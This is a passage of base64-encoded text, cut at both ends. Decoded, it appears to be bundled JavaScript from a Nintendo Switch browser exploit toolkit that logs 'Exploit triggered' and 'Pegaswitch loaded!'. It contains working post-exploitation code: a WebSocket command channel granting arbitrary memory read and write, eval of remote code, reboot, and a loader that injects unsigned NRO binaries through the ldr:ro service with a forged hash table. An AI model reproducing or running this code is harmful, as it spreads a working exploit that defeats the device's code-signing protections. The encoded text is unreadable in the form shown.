HRcdFx0XHRyZXNwb25zZTogdXRpbHMucGFkZHIoc2MuZ2V0U1AoKSlcblx0XHRcdH0pKTtcblx0XHR9IGVsc2UgaWYgKGRhdGEuY21kID09PSAnZ2MnKSB7XG5cdFx0XHR1dGlscy5sb2coJ3J1bm5pbmcgR0MnKTtcblx0XHRcdHNjLmdjKCk7XG5cdFx0XHRzb2NrZXQuc2VuZChKU09OLnN0cmluZ2lmeSh7XG5cdFx0XHRcdHR5cGU6ICdnY3Jhbidcblx0XHRcdH0pKTtcblx0XHR9IGVsc2UgaWYgKGRhdGEuY21kID09PSAnbWFsbG9jJykge1xuXHRcdFx0dmFyIHNpemUgPSBwYXJzZUludChkYXRhLmFyZ3NbMF0pO1xuXHRcdFx0dmFyIGFkZHIgPSBzYy5tYWxsb2Moc2l6ZSk7XG5cdFx0XHRzb2NrZXQuc2VuZChKU09OLnN0cmluZ2lmeSh7XG5cdFx0XHRcdHR5cGU6ICdtYWxsb2NkJyxcblx0XHRcdFx0cmVzcG9uc2U6IHV0aWxzLnBhZGRyKGFkZHIpXG5cdFx0XHR9KSk7XG5cdFx0fSBlbHNlIGlmIChkYXRhLmNtZCA9PT0gJ2ZyZWUnKSB7XG5cdFx0XHR2YXIgYWRkciA9IHV0aWxzLnBhcnNlQWRkcihkYXRhLmFyZ3NbMF0pO1xuXHRcdFx0c2MuZnJlZShhZGRyKTtcblx0XHR9IGVsc2UgaWYgKGRhdGEuY21kID09PSAnd3JpdGU0JyB8fCBkYXRhLmNtZCA9PT0gJ3dyaXRlOCcpIHtcblx0XHRcdHV0aWxzLmxvZyhKU09OLnN0cmluZ2lmeShkYXRhKSk7XG5cdFx0XHR2YXIgYWRkciA9IHV0aWxzLnBhcnNlQWRkcihkYXRhLmFyZ3NbMF0pO1xuXHRcdFx0dmFyIHZhbHVlID0gcGFyc2VJbnQoZGF0YS5hcmdzWzFdKTtcblx0XHRcdHZhciBvZmZzZXQgPSBwYXJzZUludChkYXRhLmFyZ3NbMl0pIHx8IDA7XG5cblx0XHRcdHNjW2RhdGEuY21kXSh2YWx1ZSwgYWRkciwgb2Zmc2V0KTtcblx0XHR9IGVsc2UgaWYgKGRhdGEuY21kID09PSAncmVhZDQnIHx8IGRhdGEuY21kID09PSAncmVhZDgnKSB7XG5cdFx0XHR2YXIgYWRkciA9IHV0aWxzLnBhcnNlQWRkcihkYXRhLmFyZ3NbMF0pO1xuXHRcdFx0dmFyIG9mZnNldCA9IHBhcnNlSW50KGRhdGEuYXJnc1sxXSkgfHwgMDtcblxuXHRcdFx0dmFyIHJlc3BvbnNlID0gc2NbZGF0YS5jbWRdKGFkZHIsIG9mZnNldCk7XG5cblx0XHRcdHNvY2tldC5zZW5kKEpTT04uc3RyaW5naWZ5KHtcblx0XHRcdFx0dHlwZTogJ3JyZWFkJyxcblx0XHRcdFx0cmVzcG9uc2U6IHJlc3BvbnNlXG5cdFx0XHR9KSk7XG5cdFx0fSBlbHNlIGlmIChkYXRhLmNtZCA9PT0gJ3JlYWRzdHJpbmcnKSB7XG5cdFx0XHR2YXIgYWRkciA9IHV0aWxzLnBhcnNlQWRkcihkYXRhLmFyZ3NbMF0pO1xuXHRcdFx0dmFyIGxlbmd0aCA9IHBhcnNlSW50KGRhdGEuYXJnc1sxXSkgfHwgMDtcblxuXHRcdFx0c29ja2V0LnNlbmQoSlNPTi5zdHJpbmdpZnkoe1xuXHRcdFx0XHR0eXBlOiAncnJlYWRzdHJpbmcnLFxuXHRcdFx0XHRyZXNwb25zZTogc2MucmVhZFN0cmluZyhhZGRyLCBsZW5ndGgpXG5cdFx0XHR9KSk7XG5cdFx0fSBlbHNlIGlmIChkYXRhLmNtZCA9PT0gJ2V2YWwnKSB7XG5cdFx0XHR2YXIgd29yZHMgPSBPYmplY3Qua2V5cyhyZXNlcnZlZFdvcmRzLktFWVdPUkRTWyc2LXN0cmljdCddKTtcblx0XHRcdHZhciBjb2RlID0gZGF0YS5hcmdzLmpvaW4oJyAnKTtcblx0XHRcdHZhciByZXQgPSB0cnVlO1xuXHRcdFx0aWYgKH5jb2RlLmluZGV4T2YoJ3dpbmRvdy5yZXNwb25zZScpKSB7XG5cdFx0XHRcdHJldCA9IGZhbHNlO1xuXHRcdFx0fVxuXHRcdFx0Zm9yICh2YXIgaSA9IDA7IGkgPCB3b3Jkcy5sZW5ndGg7IGkrKykge1xuXHRcdFx0XHR2YXIgdyA9IHdvcmRzW2ldO1xuXHRcdFx0XHR2YXIgcyA9IGNvZGUuc3Vic3RyKDAsIHcubGVuZ3RoKTtcblx0XHRcdFx0aWYgKHMgPT09IHcpIHtcblx0XHRcdFx0XHRyZXQgPSBmYWxzZTtcblx0XHRcdFx0fVxuXHRcdFx0fVxuXHRcdFx0aWYgKHJldCkge1xuXHRcdFx0XHRjb2RlID0gJ3dpbmRvdy5yZXNwb25zZSA9ICcgKyBjb2RlO1xuXHRcdFx0fVxuXHRcdFx0d2luZG93LnJlc3BvbnNlID0gbnVsbDtcblx0XHRcdGV2YWwoJ3dpdGggKHNjKSB7ICcgKyBjb2RlICsgJ30nKTtcblx0XHRcdHNvY2tldC5zZW5kKEpTT04uc3RyaW5naWZ5KHtcblx0XHRcdFx0dHlwZTogJ2V2YWxkJyxcblx0XHRcdFx0cmVzcG9uc2U6IHdpbmRvdy5yZXNwb25zZSB8fCAnbm8gb3V0cHV0J1xuXHRcdFx0fSkpO1xuXHRcdH0gZWxzZSBpZiAoZGF0YS5jbWQgPT09ICdldmFsZmlsZScpIHtcblx0XHRcdHZhciBjb2RlID0gZGF0YS5hcmdzWzBdO1xuXHRcdFx0ZXZhbCgnd2l0aCAoc2MpIHtcXG4nICsgY29kZSArICdcXG59Jyk7XG5cdFx0XHRzb2NrZXQuc2VuZChKU09OLnN0cmluZ2lmeSh7XG5cdFx0XHRcdHR5cGU6ICdldmFsZCcsXG5cdFx0XHRcdHJlc3BvbnNlOiAnbm8gb3V0cHV0J1xuXHRcdFx0fSkpO1xuXHRcdH0gZWxzZSBpZiAoZGF0YS5jbWQgPT09ICdyZWJvb3QnKSB7XG5cdFx0XHRzb2NrZXQuc2VuZChKU09OLnN0cmluZ2lmeSh7XG5cdFx0XHRcdHR5cGU6ICdyZWJvb3RpbmcnLFxuXHRcdFx0XHRyZXNwb25zZTogJ1JlYm9vdGluZy4uLidcblx0XHRcdH0pKTtcblx0XHRcdHNjLmlwY01zZygxKS5zZW5kVG8oXCJicGNcIikuYXNzZXJ0T2soKTtcblx0XHR9IGVsc2UgaWYgKGRhdGEuY21kID09PSAncnVubnJvJykge1xuXHRcdFx0cnVuTnJvKGRhdGEuYXJnc1swXSwgZGF0YS5hcmdzLnNsaWNlKDEpKTtcblx0XHRcdHNvY2tldC5zZW5kKEpTT04uc3RyaW5naWZ5KHtcblx0XHRcdFx0dHlwZTogJ3Jhbm5ybycsXG5cdFx0XHRcdHJlc3BvbnNlOiAnbm8gb3V0cHV0J1xuXHRcdFx0fSkpO1xuXHRcdH1cblx0fTtcbn1cblxuZnVuY3Rpb24gc2V0dXBMaXN0ZW5lciAoc2MpIHtcblx0c29ja2V0ID0gbmV3IFdlYlNvY2tldCgnd3M6Ly8nICsgd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lICsgJzo4MTAwJyk7XG5cblx0dmFyIGhhbmRsZXJGY24gPSBoYW5kbGVyKHNjLCBzb2NrZXQpO1xuXHRzb2NrZXQub25tZXNzYWdlID0gKGV2dCkgPT4ge1xuXHRcdHRyeSB7XG5cdFx0XHRoYW5kbGVyRmNuKGV2dCk7XG5cdFx0fSBjYXRjaCAoZSkge1xuXHRcdFx0d2luZG93Lm9uZXJyb3IoZS5tZXNzYWdlLCBudWxsLCBlLmxpbmUsIG51bGwsIGUpO1xuXHRcdH1cblx0fTtcblxuXHRzb2NrZXQub25vcGVuID0gZnVuY3Rpb24gKCkge1xuXHRcdHNjLmdldFNlcnZpY2UoXCJzZXQ6Y2FsXCIsIChzZXRjYWwpID0+IHtcblx0XHRcdHNvY2tldC5zZW5kKEpTT04uc3RyaW5naWZ5KHtcblx0XHRcdFx0dHlwZTogXCJpZGVudGlmaWNhdGlvblwiLFxuXHRcdFx0XHRtYWM6IHNjLmlwY01zZyg2KS5zZW5kVG8oc2V0Y2FsKS5hc3NlcnRPaygpLmRhdGEsXG5cdFx0XHRcdHZlcnNpb246IHNjLnZlcnNpb25cblx0XHRcdH0pKTtcblx0XHR9KTtcblx0XHR1dGlscy5sb2coXCJDb25uZWN0ZWQgdG8gUEMuLi5cIik7XG5cdH07XG5cblx0c29ja2V0Lm9uZXJyb3IgPSBmdW5jdGlvbigpIHtcblx0XHR1dGlscy5sb2coXCJzb2NrZXQgZXJyb3IsIGF0dGVtcHRpbmcgdG8gcmVjb25uZWN0IGluIDUgc2Vjb25kcy4uLlwiKTtcblx0XHR3aW5kb3cuc2V0VGltZW91dCgoKSA9PiB7XG5cdFx0XHRzb2NrZXQuY2xvc2UoKTtcblx0XHRcdHNldHVwTGlzdGVuZXIoc2MpO1xuXHRcdH0sIDUwMDApO1xuXHR9O1xuXHRcblx0c29ja2V0Lm9uY2xvc2UgPSBmdW5jdGlvbigpIHtcblx0XHR1dGlscy5sb2coXCJzb2NrZXQgY2xvc2VkLCBhdHRlbXB0aW5nIHRvIHJlY29ubmVjdCBpbiA1IHNlY29uZHMuLi5cIik7XG5cdFx0d2luZG93LnNldFRpbWVvdXQoKCkgPT4ge1xuXHRcdFx0dXRpbHMubG9nKFwiYXR0ZW1wdGluZyB0byByZWNvbm5lY3QuLi5cIik7XG5cdFx0XHRzZXR1cExpc3RlbmVyKHNjKTtcblx0XHR9LCA1MDAwKTtcblx0fTtcbn1cblxuZnVuY3Rpb24gbWFpbiAoKSB7XG5cdGlmICh3aW5kb3cuZXhwbG9pdE1lID09PSBudWxsKSB7XG5cdFx0dXRpbHMubG9nKCdFeHBsb2l0IGZhaWxlZC4nKTtcblx0XHRpZiAod2luZG93LmVycm1zZyA9PT0gbnVsbCkgeyB1dGlscy5sb2coJ1Vua25vd24gcmVhc29uLicpOyB9IGVsc2UgeyB1dGlscy5sb2cod2luZG93LmVycm1zZyk7IH1cblx0XHR1dGlscy5sb2coJ35+ZmFpbGVkJyk7XG5cdFx0d2luZG93LmxvY2F0aW9uLnJlbG9hZCgpO1xuXHRcdHJldHVybjtcblx0fVxuXG5cdHV0aWxzLmxvZygnRXhwbG9pdCB0cmlnZ2VyZWQuIEJlZ2lubmluZyBicmVha2FnZS4nKTtcblx0dmFyIHNjID0gd2luZG93LnNjID0gbmV3IFNwbG9pdENvcmUod2luZG93LmV4cGxvaXRNZSk7IC8vIEtlZXAgU0MgaW4gd2luZG93IGp1c3Qgc28gdGhlIEdDIG5ldmVyIGV2ZW4gdHJpZXMgdG8gd2lwZSB1cyBvdXQuIEp1c3QgZm9yIHNhbml0eS5cblxuXHQvLyBTREJDb3JlIGlzIHVwXG5cdGlmIChzYy5zZGIgIT0gbnVsbCAmJiBjb25maWcuYXV0b3J1bikge1xuXHRcdHNjLnNkYi5vbnJlYWR5ID0gZnVuY3Rpb24oKSB7XG5cdFx0XHQvLyBBdXRvTlJPXG5cdFx0XHR1dGlscy5sb2coXCJSdW5uaW5nIGF1dG8ubnJvXCIpO1xuXHRcdFx0dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO1xuXHRcdFx0eGhyLm9wZW4oJ0dFVCcsICcvbnJvcy9hdXRvLm5ybycsIGZhbHNlKTtcblx0XHRcdHhoci5zZW5kKG51bGwpO1xuXG5cdFx0XHRpZiAoeGhyLnN0YXR1cyA9PT0gMjAwKSB7XG5cdFx0XHRcdHZhciBucm8gPSBuZXcgVWludDhBcnJheShKU09OLnBhcnNlKHhoci5yZXNwb25zZSkpLmJ1ZmZlcjtcblx0XHRcdFx0Y29uc29sZS5sb2cobnJvLmxlbmd0aCk7XG5cdFx0XHRcdHJ1bk5ybyhucm8pO1xuXHRcdFx0fVxuXHRcdH07XG5cdH1cblxuXHR1dGlscy5sb2coJ1BlZ2Fzd2l0Y2ggbG9hZGVkIScpO1xuXHR1dGlscy5sb2coJ1VBOiAnICsgbmF2aWdhdG9yLnVzZXJBZ2VudCk7XG5cblx0c2V0dXBMaXN0ZW5lcihzYyk7XG59XG5cbnRyeSB7XG5cdG1haW4oKTtcbn0gY2F0Y2ggKGUpIHtcblx0d2luZG93Lm9uZXJyb3IoZS5tZXNzYWdlLCBudWxsLCBlLmxpbmUsIG51bGwsIGUpO1xufVxuIiwiLypcblx0cmVxdWlyZXMgc3BsIE1JVE0gYW5kIHJvIWVhc2VfbnJvX3Jlc3RyaWN0aW9uID0gMHgxXG4qL1xuXG52YXIgdXRpbHMgPSByZXF1aXJlKFwiLi91dGlsc1wiKVxuXG5tb2R1bGUuZXhwb3J0cyA9IChyZXMsIGFyZ3MpID0+IHtcblx0aWYoIXNjLnNkYikge1xuXHRcdHRocm93IG5ldyBFcnJvcihcInJlcXVpcmVzIHNwbCBtaXRtLiB0cnkgYGVuYWJsZSBzZGJjb3JlYFwiKTtcblx0fVxuXHRpZihzYy52ZXJzaW9uICE9PSBcIjMuMC4wXCIpIHtcblx0XHR0aHJvdyBuZXcgRXJyb3IoXCJyZXF1aXJlcyAzLjAuMFwiKTtcblx0fVxuXHRcblx0dmFyIG5yciA9IG5ldyBBcnJheUJ1ZmZlcigweDEwMDApO1xuXHR2YXIgbnJydTMyID0gbmV3IFVpbnQzMkFycmF5KG5ycik7XG5cdG5ycnUzMlswXSA9IDB4MzA1MjUyNEU7IC8vIE5SUjBcblx0bnJydTMyWygweDMzOCA+PiAyKSArIDBdID0gMHgxMDAwOyAvLyBTaXplXG5cdG5ycnUzMlsoMHgzNDAgPj4gMikgKyAwXSA9IDB4MzUwOyAvLyBIYXNoIG9mZnNldFxuXHRucnJ1MzJbKDB4MzQwID4+IDIpICsgMV0gPSAweDE7IC8vIEhhc2ggY291bnRcblx0XG5cdHdoaWxlKHJlcy5sZW5ndGggJiAweEZGRilcblx0XHRyZXMucHVzaCgwKTtcblx0dmFyIHU4ID0gbmV3IFVpbnQ4QXJyYXkocmVzKTtcblx0dmFyIHUzMiA9IG5ldyBVaW50MzJBcnJheSh1OC5idWZmZXIpO1xuXG5cdHZhciBucm9TaXplID0gdTMyWzB4MTggPj4gMl07XG5cdHZhciBic3NTaXplID0gdTMyWzB4MzggPj4gMl07XG5cdHZhciBtb2QwT2Zmc2V0ID0gdTMyWzFdO1xuXHR2YXIgZHluYW1pY09mZnNldCA9IG1vZDBPZmZzZXQgKyB1MzJbKG1vZDBPZmZzZXQgPj4gMikgKyAxXTtcblxuXHR1dGlscy5sb2coXCJkeW5hbWljIG9mZnNldDogMHhcIiArIGR5bmFtaWNPZmZzZXQudG9TdHJpbmcoMTYpKTtcblxuXHRjcnlwdG8uc3VidGxlLmRpZ2VzdChcIlNIQS0yNTZcIiwgdTguYnVmZmVyKS50aGVuKChoYXNoKSA9PiB7XG5cdFx0dmFyIG5ycmhhc2h1OCA9IG5ldyBVaW50OEFycmF5KG5yciwgMHgzNTAsIDMyKTtcblx0XHR2YXIgaGFzaHU4ID0gbmV3IFVpbnQ4QXJyYXkoaGFzaCk7XG5cdFx0bnJyaGFzaHU4LnNldChoYXNodTgpO1xuXHRcdFxuXHRcdHNjLmdldFNlcnZpY2UoXCJsZHI6cm9cIiwgKGxkcnJvKSA9PiB7XG5cdFx0XHR2YXIgbnJyYWRkciA9IHNjLmdldEFycmF5QnVmZmVyQWRkcihucnIpO1xuXHRcdFx0c2MuaXBjTXNnKDQpLmRhdGF1NjQoMCkuc2VuZFBpZCgpLmNvcHlIYW5kbGUoMHhmZmZmODAwMSkuc2VuZFRvKGxkcnJvKS5hc3NlcnRPaygpO1xuXHRcdFx0c2MuaXBjTXNnKDIpLmRhdGF1NjQoMCwgbnJyYWRkciwgbnJyLmJ5dGVMZW5ndGgpLnNlbmRQaWQoKS5zZW5kVG8obGRycm8pLnNob3coKTtcblx0XHRcdFxuXHRcdFx0dmFyIG5yb2Jhc2UgPSBzYy5tYWxsb2ModTgubGVuZ3RoICsgYnNzU2l6ZSArIDB4ZmZmKTtcblx0XHRcdGlmKG5yb2Jhc2VbMF0gJiAweEZGRilcblx0XHRcdFx0bnJvYmFzZVswXSA9ICgobnJvYmFzZVswXSAmIDB4RkZGRkYwMDApICsgMHgxMDAwKSA+Pj4gMDtcblx0XHRcdFxuXHRcdFx0c2MubWVtY3B5KG5yb2Jhc2UsIHU4LCB1OC5ieXRlTGVuZ3RoKTtcblx0XHRcdFxuXHRcdFx0c2Muc3ZjTnJvQmFzZSA9IHNjLmlwY01zZygwKS5kYXRhdTY0KDAsIG5yb2Jhc2UsIG5yb1NpemUsIHV0aWxzLmFkZDIobnJvYmFzZSwgbnJvU2l6ZSksIGJzc1NpemUpLnNlbmRQaWQoKS5zZW5kVG8obGRycm8pLmFzc2VydE9rKCkuZGF0YTtcblxuXHRcdFx0c2MuaXBjTXNnKDMpLmRhdGF1NjQoMCwgbnJyYWRkcikuc2VuZFBpZCgpLnNlbmRUbyhsZHJybykuYXNzZXJ0T2soKTtcblx0XHRcdFxuXHRcdFx0dXRpbHMubG9nKCdOUk8gbG9hZGVkIGF0ICcgKyB1dGlscy5wYWRkcihzYy5zdmNOcm9CYXNlKSk7XG5cblx0XHRcdGlmKGFyZ3MgPT09IHVuZGVmaW5lZCkge1xuXHRcdFx0XHRhcmdzID0gW107XG5cdFx0XHR9XG5cdFx0XHR2YXIgYXJnQWJzID0gYXJncy5tYXAoKGFyZykgPT4gdXRpbHMuc3RyMmFiKGFyZykpO1xuXHRcdFx0dmFyIGFyZ3YgPSBuZXcgVWludDMyQXJyYXkoYXJnQWJzLmxlbmd0aCAqIDIpO1xuXHRcdFx0Zm9yKHZhciBpID0gMDsgaSA8IGFyZ0Ficy5sZW5ndGg7IGkrKykge1xuXHRcdFx0XHR2YXIgYWRkciA9IHNjLmdldEFycmF5QnVmZmVyQWRkcihhcmdBYnNbaV0pO1xuXHRcdFx0XHRhcmd2WyhpKjIpKzBdID0gYWRkclswXTtcblx0XHRcdFx0YXJndlsoaSoyKSsxXSA9IGFkZHJbMV07XG5cdFx0XHR9XG5cdFx0XHR1dGlscy5oZXhkdW1wKFwiYXJndlwiLCBhcmd2KTtcblxuXHRcdFx0dmFyIGFyZ3ZBZGRyID0gc2MuZ2V0QXJyYXlCdWZmZXJBZGRyKGFyZ3YpO1xuXG5cdFx0XHR2YXIgbWFnaWMgPSB1dGlscy5wYXJzZUFkZHIoXCIwMDc4NzQ2MzVmNjU2MzYxXCIpO1xuXHRcdFx0dmFyIGFwcEhlYXAgPSBuZXcgQXJyYXlCdWZmZXIoMHg0MDAwMDApO1xuXHRcdFx0dmFyIGFwcEhlYXBBZGRyID0gc2MuZ2V0QXJyYXlCdWZmZXJBZGRyKGFwcEhlYXApO1xuXHRcdFx0XG5cdFx0XHR2YXIgbGlidHJhbnNpc3RvckNvbnRleHQgPSBuZXcgVWludDMyQXJyYXkoW1xuXHRcdFx0XHRtYWdpY1swXSwgbWFnaWNbMV0sXG5cdFx0XHRcdDMsIDAsIC8vIHZlcnNpb25cblx0XHRcdFx0MCwgMCwgLy8gc2l6ZSAod3JpdHRlbiBpbiBsYXRlcilcblxuXHRcdFx0XHQwLCAwLCAvLyBPVVQgY2hhciAqbG9nX2J1ZmZlclxuXHRcdFx0XHQwLCAwLCAvLyBPVVQgc2l6ZV90ICpsb2dfc2l6ZVxuXG5cdFx0XHRcdGFyZ3ZBZGRyWzBdLCBhcmd2QWRkclsxXSwgLy8gSU4gY2hhciAqKmFyZ3Zcblx0XHRcdFx0YXJnQWJzLmxlbmd0aCwgMCwgLy8gSU4gdWludDY0X3QgYXJnY1xuXG5cdFx0XHRcdGFwcEhlYXBBZGRyWzBdLCBhcHBIZWFwQWRkclsxXSwgLy8gSU4gdm9pZCogbWVtX2Jhc2Vcblx0XHRcdFx0YXBwSGVhcC5ieXRlTGVuZ3RoLCAwLCAvLyBJTiB1aW50NjRfdCBtZW1fc2l6ZVxuXG5cdFx0XHRcdDAsIC8vIElOIGJvb2wgaGFzX2JzZFxuXHRcdFx0XHQwLCAvLyBwYWRkaW5nXG5cdFx0XHRcdDAsIDAsIDAsIDAsIC8vIElOIGlwY19vYmplY3RfdCBic2Rfb2JqZWN0XG5cdFx0XHRcdDAsIC8vIElOIGludCBzdGRfc29ja2V0XG5cblx0XHRcdFx0MCwgLy8gSU4gYm9vbCBoYXNfcm9cblx0XHRcdFx0MCwgMCwgMCwgMCwgLy8gSU4gaXBjX29iamVjdF90IHJvX29iamVjdFxuXG5cdFx0XHRcdDAsIC8vIHdvcmtzdGF0aW9uX2FkZHJcblx0XHRcdFx0MCwgLy8gcGFkZGluZ1xuXHRcdFx0XHRcblx0XHRcdFx0MCwgMCwgLy8gT1VUIHJldHVybl9mbGFnc1xuXG5cdFx0XHRcdDAsIC8vIElOIHRocmVhZF9oIG1haW5fdGhyZWFkXG5cdFx0XHRcdDAsIC8vIHBhZGRpbmdcblx0XHRcdF0pO1xuXHRcdFx0bGlidHJhbnNpc3RvckNvbnRleHRbNF0gPSBsaWJ0cmFuc2lzdG9yQ29udGV4dC5ieXRlTGVuZ3RoO1xuXHRcdFx0XG5cdFx0XHR1dGlscy5sb2coXCJjbG9zaW5nIHNtIGFuZCBqdW1waW5nLi4uXCIpO1xuXHRcdFx0c2Muc3ZjQ2xvc2VIYW5kbGUoc2Muc21IYW5kbGUpLmFzc2VydE9rKCk7XG5cdFx0XHRzYy5zbUhhbmRsZSA9IHVuZGVmaW5lZDtcblx0XHRcdHV0aWxzLmxvZyhcInJldHVybmVkIFwiICsgdXRpbHMucGFkZHIoc2MuY2FsbCh1dGlscy5hZGQyKHNjLnN2Y05yb0Jhc2UsIDB4ODApLCBbbGlidHJhbnNpc3RvckNvbnRleHRdKSkpO1xuXHRcdFx0XG5cdFx0XHR2YXIgbG9nQnVmZmVyQWRkciA9IFtsaWJ0cmFuc2lzdG9yQ29udGV4dFs2XSwgbGlidHJhbnNpc3RvckNvbnRleHRbN11dO1xuXHRcdFx0dmFyIGxvZ0xlbmd0aEFkZHIgPSBbbGlidHJhbnNpc3RvckNvbnRleHRbOF0sIGxpYnRyYW5zaXN0b3JDb250ZXh0WzldXTtcblx0XHRcdHV0aWxzLmxvZyhcImxvZyBidWZmZXI6IFwiICsgdXRpbHMucGFkZHIobG9nQnVmZmVyQWRkcikpO1xuXHRcdFx0XG5cdFx0XHR1dGlscy5sb2coXCJMT0c6XCIpO1xuXHRcdFx0c2MubWVtdmlldyhsb2dCdWZmZXJBZGRyLCBzYy5yZWFkNChsb2dMZW5ndGhBZGRyKSwgKGxvZ2FiKSA9PiB7XG5cdFx0XHRcdHV0aWxzLmxvZyh1dGlscy51OGEybnVsbHN0cihuZXcgVWludDhBcnJheShsb2dhYikpKTtcblx0XHRcdH0pO1xuXG5cdFx0XHR2YXIgZmxhZ3NMbyA9IGxpYnRyYW5zaXN0b3JDb250ZXh0WzMyXTtcblx0XHRcdGlmKChmbGFnc0xvICYgNCkgPiAwKSB7IC8vIFJFVEZfQ0xPU0VfQlJPV1NFUlxuXHRcdFx0XHR3aW5kb3cuY2xvc2UoKTtcblx0XHRcdH1cblx0XHR9KTtcblx0fSkuY2F0Y2goKGUpID0+IHtcblx0XHR1dGlscy5sb2coXCJlcnJvciBpbiB0aGVuKClcIik7XG5cdFx0d2luZG93Lm9uZXJyb3IoZS5tZXNzYWdlLCBudWxsLCBlLmxpbmUsIG51bGwsIGUpO1xuXHR9KTtcbn07XG4iLCJ2YXIgdXRpbHMgPSByZXF1aXJlKCcuL3V0aWxzJyk7XHJcbnZhciBzdmNNaXhpbiA9IHJlcXVpcmUoJy4vc3ZjJyk7XHJcbnZhciBzcGxvaXRNaXhpbiA9IHJlcXVpcmUoJy4vc3Bsb2l0TWl4aW4nKTtcclxuXHJcbmZ1bmN0aW9uIGMzMnRvOChkYXRhKVxyXG57XHJcblx0dmFyIGxlbiA9IGRhdGEubGVuZ3RoO1xyXG5cdHZhciByZXQgPSBuZXcgVWludDhBcnJheShsZW4gKiA0KTtcclxuXHR2YXIgb2ZmcyA9IDA7XHJcblxyXG5cdGZvcihpID0gMDsgaSA8IGxlbjsgaSsrKVxyXG5cdHtcclxuXHRcdHJldFtvZmZzKytdID0gZGF0YVtpXSAmIDB4RkY7XHJcblx0XHRyZXRbb2ZmcysrXSA9IChkYXRhW2ldID4+PiA4KSAmIDB4RkY7XHJcblx0XHRyZXRbb2ZmcysrXSA9IChkYXRhW2ldID4+PiAxNikgJiAweEZGO1xyXG5cdFx0cmV0W29mZnMrK10gPSBkYXRhW2ldID4+PiAyNDtcclxuXHR9XHJcblxyXG5cdHJldHVybiByZXQ7XHJcbn1cclxuXHJcbmZ1bmN0aW9uIGM2NHRvOChkYXRhKVxyXG57XHJcblx0dmFyIGxlbiA9IGRhdGEubGVuZ3RoO1xyXG5cdHZhciByZXQgPSBuZXcgVWludDhBcnJheShsZW4gKiA4KTtcclxuXHR2YXIgb2ZmcyA9IDA7XHJcblxyXG5cdGZvcihpID0gMDsgaSA8IGxlbjsgaSsrKVxyXG5cdHtcclxuXHRcdHJldFtvZmZzKytdID0gZGF0YVtpXVswXSAmIDB4RkY7XHJcblx0XHRyZXRbb2ZmcysrXSA9IChkYXRhW2ldWzBdID4+PiA4KSAmIDB4RkY7XHJcblx0XHRyZXRbb2ZmcysrXSA9IChkYXRhW2ldWzBdID4+PiAxNikgJiAweEZGO1xyXG5cdFx0cmV0W29mZnMrK10gPSAoZGF0YVtpXVswXSA+Pj4gMjQpICYgMHhGRjtcclxuXHRcdHJldFtvZmZzKytdID0gZGF0YVtpXVsxXSAmIDB4RkY7XHJcblx0XHRyZXRbb2ZmcysrXSA9IChkYXRhW2ldWzFdID4+PiA4KSAmIDB4RkY7XHJcblx0XHRyZXRbb2ZmcysrXSA9IChkYXRhW2ldWzFdID4+PiAxNikgJiAweEZGO1xyXG5cdFx0cmV0W29mZnMrK10gPSAoZGF0YVtpXVsxXSA+Pj4gMjQpICYgMHhGRjtcclxuXHR9XHJcblxyXG5cdHJldHVybiByZXQ7XHJcbn1cclxuXHJcbmZ1bmN0aW9uIGM4dG8zMihkYXRhKVxyXG57XHJcblx0dmFyIGxlbiA9IGRhdGEubGVuZ3RoIC8gNDtcclxuXHR2YXIgcmV0ID0gbmV3IFVpbnQzMkFycmF5KGxlbik7XHJcblx0dmFyIG9mZnMgPSAwO1xyXG5cclxuXHRmb3IoaSA9IDA7IGkgPCBsZW47IGkrKylcclxuXHR7XHJcblx0XHRyZXRbaV0gPSBkYXRhW29mZnMrK107XHJcblx0XHRyZXRbaV0gfD0gZGF0YVtvZmZzKytdIDw8IDg7XHJcblx0XHRyZXRbaV0gfD0gZGF0YVtvZmZzKytdIDw8IDE2O1xyXG5cdFx0cmV0W2ldIHw9IGRhdGFbb2ZmcysrXSA8PCAyNDtcclxuXHR9XHJcblxyXG5cdHJldHVybiByZXQ7XHJcbn1cclxuXHJcbmZ1bmN0aW9uIF9jcmMoZGF0YSwgbGVuKVxyXG57XHJcblx0dmFyIGNyYyA9IDA7XHJcblxyXG5cdGZvcihqID0gMDsgaiA8IGxlbjsgaisrKVxyXG5cdHtcclxuXHRcdHZhciB2ID0gMHg4MDtcclxuXHRcdGZvcihpID0gMDsgaSA8IDg7IGkrKylcclxuXHRcdHtcclxuXHRcdFx0dmFyIHhvcmYgPSBjcmMgJiAweDgwMDA7XHJcblx0XHRcdGNyYyA9IChjcmMgPDwgMSkgJiAweEZGRkZcclxuXHJcblx0XHRcdGlmKGRhdGFbal0gJiB2KVxyXG5cdFx0XHRcdGNyYyA9IChjcmMgKyAxKSAmIDB4RkZGRjtcclxuXHRcdFx0aWYoeG9yZilcclxuXHRcdFx0XHRjcmMgXj0gMHgxMDIxO1xyXG5cdFx0XHR2ID4+PSAxO1xyXG5cdFx0fVxyXG5cdH1cclxuXHRyZXR1cm4gY3JjO1xyXG59XHJcblxyXG5mdW5jdGlvbiB3cml0ZVBkbShwYXlsb2FkKVxyXG57XHJcbi8vXHR2YXIgZGF0YSA9IHBheWxvYWQuYnVmZmVyO1xyXG4vL1x0dXRpbHMuaGV4ZHVtcChcImRhdFwiLCBkYXRhKTtcclxuXHRzYy5pcGNNc2coNCkuc2VuZFRvKCdwZG06bnRmeScpLmFzc2VydE9rKCk7XHJcbi8vXHRzYy5pcGNNc2coNSkuYURlc2NyaXB0b3IoZGF0YSwgZGF0YS5ieXRlTGVuZ3RoLCAwKS5zZW5kVG8oJ3BkbTpudGZ5JykuYXNzZXJ0T2soKTtcclxuXHRzYy5pcGNNc2coNSkuYURlc2NyaXB0b3IocGF5bG9hZCwgcGF5bG9hZC5sZW5ndGgsIDApLnNlbmRUbygncGRtOm50ZnknKS5hc3NlcnRPaygpO1xyXG59XHJcblxyXG5mdW5jdGlvbiBnZXRNaWlBdXRob3JJZCgpXHJcbntcclxuXHRyZXR1cm4gYzMydG84KHNjLmlwY01zZyg5MCkuc2VuZFRvKCdzZXQ6c3lzJykuYXNzZXJ0T2soKS5kYXRhKTtcclxufVxyXG5cclxuZnVuY3Rpb24gY3JjTWlpQnVmKGIsIGF1dGhvcmlkKVxyXG57XHJcblx0dmFyIHJldCA9IG5ldyBVaW50OEFycmF5KGIubGVuZ3RoICsgNCk7XHJcblx0cmV0LnNldChiKTtcclxuXHJcblx0dmFyIGNyYzEgPSBfY3JjKHJldCwgYi5sZW5ndGggKyAyKTtcclxuXHRyZXRbYi5sZW5ndGhdID0gY3JjMSA+PiA4O1xyXG5cdHJldFtiLmxlbmd0aCsxXSA9IGNyYzEgJiAweEZGO1